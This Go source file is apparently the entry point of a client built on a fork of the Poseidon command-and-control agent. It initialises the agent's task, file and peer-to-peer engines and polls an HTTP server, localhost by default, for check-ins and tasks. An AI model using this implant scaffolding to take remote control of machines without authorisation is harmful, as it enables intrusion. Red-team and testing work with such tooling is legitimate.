package main

import (
	"context"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/tasks"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/ui/pollclient"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/files"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/p2p"
	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
)

const (
	defaultBaseURL       = "http://localhost:8080"
	defaultCheckinPath   = "/checkin"
	defaultPollPath      = "/poll"
	defaultPollIntervalS = 5
	httpTimeoutSeconds   = 30
)

func main() {
	ctx := context.Background()

	// Initialize the internal engine (no Mythic, no profiles)
	tasks.Initialize()
	responses.Initialize(func() chan structs.MythicMessage { return nil })
	files.Initialize()
	p2p.Initialize()

	client := buildClientFromEnv()

	if err := client.Run(ctx); err != nil {
		log.Fatalf("uiclient exited with error: %v", err)
	}
}

func buildClientFromEnv() *pollclient.Client {
	baseURL := getenvDefault("POSEIDON_UI_BASEURL", defaultBaseURL)
	checkinPath := getenvDefault("POSEIDON_UI_CHECKIN_PATH", defaultCheckinPath)
	pollPath := getenvDefault("POSEIDON_UI_POLL_PATH", defaultPollPath)
	pollInterval := time.Duration(defaultPollIntervalS) * time.Second
	if v := os.Getenv("POSEIDON_UI_POLL_INTERVAL_SECONDS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			pollInterval = time.Duration(n) * time.Second
		}
	}

	httpClient := &http.Client{Timeout: httpTimeoutSeconds * time.Second}

	return pollclient.New(pollclient.Config{
		BaseURL:     baseURL,
		CheckinPath: checkinPath,
		PollPath:    pollPath,
		Interval:    pollInterval,
		HTTPClient:  httpClient,
	})
}

func getenvDefault(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

